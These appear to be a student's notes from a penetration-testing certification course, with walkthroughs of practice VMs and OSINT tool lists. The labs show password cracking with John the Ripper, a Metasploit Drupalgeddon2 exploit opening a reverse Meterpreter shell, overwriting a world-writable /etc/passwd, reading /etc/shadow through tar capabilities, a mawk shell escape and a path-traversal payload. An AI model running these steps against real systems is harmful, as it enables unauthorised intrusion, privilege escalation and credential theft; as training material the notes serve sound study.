# ACCE Notes

## 25/10
### RCCE Lvl 2

#### Lab 8: The aim of this exercise is to find three hidden flags

```
Rocheston:~$ sudo ifconfig
vboxnet0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.5.134  netmask 255.255.255.0  broadcast 192.168.5.255

Rocheston:~$ sudo arp-scan 192.168.5.1-192.168.5.200 -I vboxnet0
Interface: vboxnet0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.9.5 with 200 hosts (https://github.com/royhills/arp-scan)
192.168.5.124	08:00:27:07:a0:19	Cadmus Computer Systems
192.168.5.134	08:00:27:90:01:c7	Cadmus Computer Systems

Rocheston:~$ sudo nmap -sC -sV 192.168.5.124
Ports open: 22,80

Rocheston:~$ sudo owasp-zap
We get /loot subdirectory

Rocheston:~$ cd downloads
Rocheston:~/downloads$ ls
1.jpg  2.jpg  3.jpg  4.jpg  image.jpeg
Rocheston:~/downloads$ sudo steghide extract -sf 1.jpg 
Enter passphrase: 
wrote extracted data to "secret.txt".
Rocheston:~/downloads$ sudo steghide extract -sf 2.jpg 
Enter passphrase: 
wrote extracted data to "emb.txt".
Rocheston:~/downloads$ sudo steghide extract -sf 3.jpg 
Enter passphrase: 
steghide: could not extract any data with that passphrase!
Rocheston:~/downloads$ sudo steghide extract -sf 4.jpg 
Enter passphrase: 
wrote extracted data to "loot.pcapng".
Rocheston:~/downloads$ sudo steghide extract -sf image.jpeg 
Enter passphrase: 
wrote extracted data to "robots.txt".

Rocheston:~/downloads$ sudo cat secret.txt 
WW91IHJlYWxseSB0aG91Z2h0IGl0IHdvdWxkIGJlIHRoaXMgZWFzeSA/IEtlZXAgZGlnZ2luZyAhIExvdHMgb2YgdHJvbGxzIHRvIGRlZmVhdC4=

Rocheston:~/downloads$ sudo echo "WW91IHJlYWxseSB0aG91Z2h0IGl0IHdvdWxkIGJlIHRoaXMgZWFzeSA/IEtlZXAgZGlnZ2luZyAhIExvdHMgb2YgdHJvbGxzIHRvIGRlZmVhdC4=" | base64 -d
You really thought it would be this easy ? Keep digging ! Lots of trolls to defeat.

Rocheston:~/downloads$ sudo cat emb.txt 
+[--->++<]>+.++[->++++<]>+.+++++++..[++>---<]>--.++[->++<]>.[--->+<]>+++.-.---------.--[--->+<]>-.+.-.--[->+++<]>-.[->+++++++<]>.++++++.---.[-->+++++<]>+++.+++[->++<]>.[-->+++<]>.+++++++++.+.+.[---->+<]>+++.+++[->++<]>.--[--->+<]>.-----------.++++++.-[--->+<]>--.-[--->++<]>-.++++++++++.+[---->+<]>+++.>+[--->++<]>.>-[----->+<]>-.++[->++<]>..----.-[--->++<]>+.-.--[++++>---<]>.-------------.-[--->+<]>+++.+[-->+<]>+++++.+.++[->+++++<]>.--.+[----->+<]>.--[++>---<]>.+[->++<]>.-[--->++<]>+.--.-[---->+++<]>-.
```

> We go to https://www.splitbrain.org/services/ook to decipher the brainfuck.

Deciphering it from brainfuck to text we get:
Well Done ! Your First Flag is V2hhdCBpcyBCYWx1dCA/

Now we use wireshark to open loot.pcapng file. From the HTTP protocols, we are able to find GET and POST request for downloading a file along with the file byte. We sekect the HTTP protocol and from wiresharkm File -> Export Objects -> HTTP we find loot.7z. Save it.

```
Rocheston:/pentest/password-recovery/johntheripper$ sudo ./7z2john.pl /home/rocheston/downloads/loot.7z > /home/rocheston/downloads/7zloot

Rocheston:/pentest/password-recovery/johntheripper$ sudo ./john /home/rocheston/downloads/7zloot --wordlist:/usr/share/wordlists/rockyou.txt
manchester       (loot.7z)


Rocheston:/pentest/password-recovery/johntheripper$ sudo ./john ~/downloads/loot/id_rsa.hash --wordlist:/usr/share/wordlists/rockyou.txt
hello

Rocheston:/pentest/password-recovery/johntheripper$ sudo cat ~/downloads/loot/id_rsa.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPf01eRsS9o4Xaaog8Acmsd8ctkNA/qweGlDVYQqfGISzy/z0Sh3a2SlEVAweLnVKz1mdoKS4LrKnKxw0cR/fe7AChdY6wq/kCodLPCPmzMZQv12RUo1awO8gpuFA4RZdSmvDmtS1220cscm0fdSDrFt2sxNfn65dgPutJg+wMgssxrExzWjp9OR6AaAlB/naarcT28/LIsMh8DeHhOd9vs/Rew6LvX0mWyLJchAzqoMPHOrSaKu/b7YbMFUlJVvrivzBy35qwOdKFuX0Fa5Wg9TWDL9B1VDu+rFV/MTMdEkss+hIvS7Nl04ovplRLSE09TVa8dPUGGzMRVTGKxHON test@mini

```

```
Last login: Tue Dec 18 01:33:12 2018 from 192.168.37.1
test@mini:~$ ls
test@mini:~$ cd .ssh
test@mini:~/.ssh$ ls -la
total 24
drwx------ 2 test test 4096 Dec  2  2018 .
drwxr-xr-x 3 test root 4096 Dec 18  2018 ..
-rw-r--r-- 1 test test  391 Dec  2  2018 authorized_keys
-rw------- 1 test test 1766 Dec  2  2018 id_rsa
-rw-r--r-- 1 test test  391 Dec  2  2018 id_rsa.pub
-rwxr-xr-x 1 test test  115 Dec  2  2018 sshscript.sh
test@mini:~/.ssh$ cat sshscript.sh 
#!/bin/bash
echo "FInally you got a shell ! Here's a flag for you  5256247262. Let's see  where you go from here"


```

```
test@mini:/var/www/html/wordpress$ cat wp-config-sample.php | more
/** MySQL database username */
define('DB_USER', 'kuya');

/** MySQL database password */
define('DB_PASSWORD', 'Chrepia##@@!!');

test@mini:/var/www/html/wordpress$ cd
test@mini:~$ ls -la
total 20
drwxr-xr-x 3 test root 4096 Dec 18  2018 .
drwxr-xr-x 4 root root 4096 Dec  2  2018 ..
-rw------- 1 test test  464 Dec 18  2018 .bash_history
drwx------ 2 test test 4096 Dec  2  2018 .ssh
-rw-r--r-- 1 test test  168 Dec  2  2018 .wget-hsts
test@mini:~$ su kaya
No passwd entry for user 'kaya'
test@mini:~$ su kuya
Password: 
kuya@mini:/home/test$ find / -perm -4000 2>/dev/null
/bin/ping
/bin/mount
/bin/su
/bin/umount
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/passwd
kuya@mini:/home/test$ cd
kuya@mini:~$ ls
shadow.tar  who_dis.txt
kuya@mini:~$ cat who_dis.txt 
Well Done ! 

BTW this was too easy :D

Here is something for you IL0v3C@f3HaV@nA
```

```
kuya@mini:~$ cat .bash_history
cd /home/kuya
chown -R kuya
chown -R kuya /home/kiya
chown -R kuya /home/kuya
su root
cd /home/kuya
cat /etc/shadow
./tar -cvf shadow.tar /etc/shadow
tar -cvf shadow.tar /etc/shadow
which tar
getcap -r / 2>/dev/null
setcap cap_dac_read_search=ep
exit
kuya@mini:~$ export PATH=/bin:/sbin:/usr/bin:/usr/sbin:$PATH
kuya@mini:~$ getcap -r / 2>/dev/null
/bin/tar = cap_dac_read_search+ep
kuya@mini:~$ tar -cvf shadow.tar "/etc/shadow"
tar: Removing leading `/' from member names
/etc/shadow
kuya@mini:~$ tar -xvf shadow.tar
etc/shadow

kuya@mini:~$ cat etc/shadow
root:$6$xmBqiwRc$UE1ERWQecpCHwNsyE4yhSYv8wMD1H1yvB4TCBZQaoZMuxioJ0c7xE/Q/WwiRK2Vdf2Y2KGeHCh4NHAq5L4JTg0:17863:0:99999:7:::

kuya@mini:~$ tar cvf shadow.tar /root
tar: Removing leading `/' from member names
/root/
/root/.nano/
/root/M3m3L0rd.txt
/root/.selected_editor
/root/.bash_history
kuya@mini:~$ tar xvf shadow.tar 
root/
root/.nano/
root/M3m3L0rd.txt
root/.selected_editor
root/.bash_history
kuya@mini:~$ cd root/
kuya@mini:~/root$ ls
M3m3L0rd.txt
kuya@mini:~/root$ cat M3m3L0rd.txt 
You did it !!!!

COngratulations :D 

I just hope you had the same fun as I had while making this box.

As this is my first box, please send in your reviews to me on syed.ashhad72@gmail.com (DOn't hack this please Mr Leet)

If you are still reading, you are wasting your time

THere is no flag here.

Seriously Stop


Well I can't help so here is the last one WeasleyIsOurKing

#PeaceOut
```

## 24/10
### RCCE Lvl 2

#### Lab 7: To get root access
```
Rocheston:~$ sudo ifconfig
vboxnet0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.5.134  netmask 255.255.255.0  broadcast 192.168.5.255

Rocheston:~$ sudo arp-scan 192.168.5.100-192.168.5.200 -I vboxnet0
Interface: vboxnet0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.9.5 with 101 hosts (https://github.com/royhills/arp-scan)
192.168.5.132	08:00:27:60:02:47	Cadmus Computer Systems
192.168.5.153	08:00:27:07:a0:19	Cadmus Computer Systems

Rocheston:~$ sudo nmap -sV -sC 192.168.5.153
Ports open: 22, 80, 111, 8080

Rocheston:~$ sudo msfconsole

msf6 > use exploit/unix/webapp/drupal_drupalgeddon2
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set rhost 192.168.5.153
rhost => 192.168.5.153

msf6 exploit(unix/webapp/drupal_drupalgeddon2) > exploit

[*] Started reverse TCP handler on 192.168.5.134:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Sending stage (39860 bytes) to 192.168.5.153
[*] Meterpreter session 1 opened (192.168.5.134:4444 -> 192.168.5.153:57160 ) at 2023-10-24 09:54:06 -0400

meterpreter > shell
Process 1852 created.
Channel 0 created.
python -c 'import pty;pty.spawn("/bin/bash")'
www-data@billu-b0x:/var/www/html$ lsb_release -a
lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 14.04.5 LTS
Release:	14.04
Codename:	trusty

www-data@billu-b0x:/var/www/html$ ls -la /etc/passwd

ls -la /etc/passwd
-rwxrwxrwx 1 root root 2606 Jun 10  2018 /etc/passwd

www-data@billu-b0x:/var/www/html$ cat /etc/passwd
cat /etc/passwd
indishell:$6$AunCdsxZ$OBxuMf0a/GqstthT4LEW8RGZxepGL7C3jHMk/IFyhLCTJ/.0fo/9Aa.s134i80z

Create a file and put all passwords in the file
Rocheston:~$ sudo openssl passwd -1 -salt abc pass123
$1$abc$66P0kBoPMsKgk3H5bxZFv/
Rocheston:~$ sudo gedit passwd

Back to msfconsole,
www-data@billu-b0x:/var/www/html$ ^C
Terminate channel 0? [y/N]  y

meterpreter > cd /etc
meterpreter > upload /home/rocheston/passwd
[*] uploading  : /home/rocheston/passwd -> passwd
[*] Uploaded -1.00 B of 2.48 KiB (-0.04%): /home/rocheston/passwd -> passwd
[*] uploaded   : /home/rocheston/passwd -> passwd
meterpreter > shell
Process 2074 created.
Channel 2 created.
python -c 'import pty;pty.spawn("/bin/bash")'
www-data@billu-b0x:/etc$ su indishell
su indishell
Password: pass123

password for indishell: pass123

indishell@billu-b0x:/etc$ sudo -i
sudo -i
root@billu-b0x:~# 
```
To Access proper tty shell enter command "python -c 'import pty;pty.spawn("/bin/bash")' "

lsb_release -a to identify the kernel version

indishell, this file has all permissions and we can modify it easily.



#### Lab 6: To gain root privileges and read the flag located at /root/flag.txt

```
vboxnet0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.5.134

Rocheston:~$ sudo arp-scan 192.168.0.100-192.168.5.163 -I vboxnet0
Interface: vboxnet0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.9.5 with 1344 hosts (https://github.com/royhills/arp-scan)
192.168.5.132	08:00:27:60:02:47	Cadmus Computer Systems
192.168.5.153	08:00:27:07:a0:19	Cadmus Computer Systems

Rocheston:~$ nmap -sC -sV 192.168.5.153 -vv
PORT    STATE SERVICE REASON  VERSION
22/tcp  open  ssh     syn-ack OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
80/tcp  open  http    syn-ack Apache httpd 2.4.10 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Clean Blog - Start Bootstrap Theme
111/tcp open  rpcbind syn-ack 2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          42287/udp  status
|_  100024  1          49362/tcp  status
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Rocheston:~$ sudo dirb http://192.168.5.153

```
/admin = here we can find notes.txt which contains name and password.

sudo ssh ted@192.168.5.153

enter password - 12345ted123

##### Enumerate all binaries that have SUID permission

find / -perm -u=s -type f 2>/dev/null

Execute the following commands

```
mawk 'BEGIN {system("/bin/sh")}'                to get the shell

id

cd /root

ls

cat flag.txt
```

# OSINT:
## OSINT framework

> Resources:
- whois
- checkusernames
- haveibeenpwned
- infospace

### Usage

```
cd /rcce/whatweb/
runscript

./whatweb paultan.org
./whatweb juggybank.com
```


# CVE to find Vulnerabilities
## Tools learned:

```
/rcce/FinalRecon
runscript
cat finalrecon.py
python3.7 finalrecon.py --full http://juggybank.com
```

- exporting to: /home/rocheston/.local/share/finalrecon/dumps/juggybank.com.txt

- go to file manager, type in the directory

- desktop>desktop1>file manager

- /home/rocheston/.local/share.finalrecon/dumps
- click juggybank.com.txt

# 9/9

## Tools learned:

- theHarvester

- cd rcce/theHarvester
- theHarvester.py

- cat theHarvester.py
- ./theHarvester.py -d petronas -b linkedin

- shodan.io (paid search engine)

- kamerka.io (good for US)

- archive service

- www.archive.org

- creepy geolocation - geocreepy.com

- identify geolocation based on photos

- windows 7 in rose.
- right click >run program > virtualbox

- geocreepy.com on rose virtualbox, install 32bit version

- open cree.py
- new project name: locate SAJAT
- keywords: sajat
- description: hired by special branch to locate sajat

- email trackers.
- www.hubspot.com

- gmail tracker

- cyberscanner.net/gmail

- in terminal, arp-scan --help

- arp-scan 10.0.0.1-10.0.0.254

- nmap -v -A www.juggybank.com

# 11/9

## Tools learned:

> Question in exam: password spraying

- caldera

- greynoise.io

- https://www.shadowserver.org/

- https://cybermap.kaspersky.com/

- http://threatmap.checkpoint.com/

- cd /usr/share/nmap/scripts/

- git clone https://github.com/scipag/vulscan.git

- ln -s `pwd`/scipag_vulscan /usr/share/nmap/scripts/vulscan

# 13/9

## Tools learned:

- Cmseek tool web app module 4

- python3 cmseek.py -u website

# 18/9 

## Topics:

> Exam Question: Explain complexity of code.

- file inclusion: localhost:2063/?page=../../../../../../etc/passwd or vnc.conf

- haja.me/tools/cmd.txt

- localhost:90/jsfuck

- sqlmap












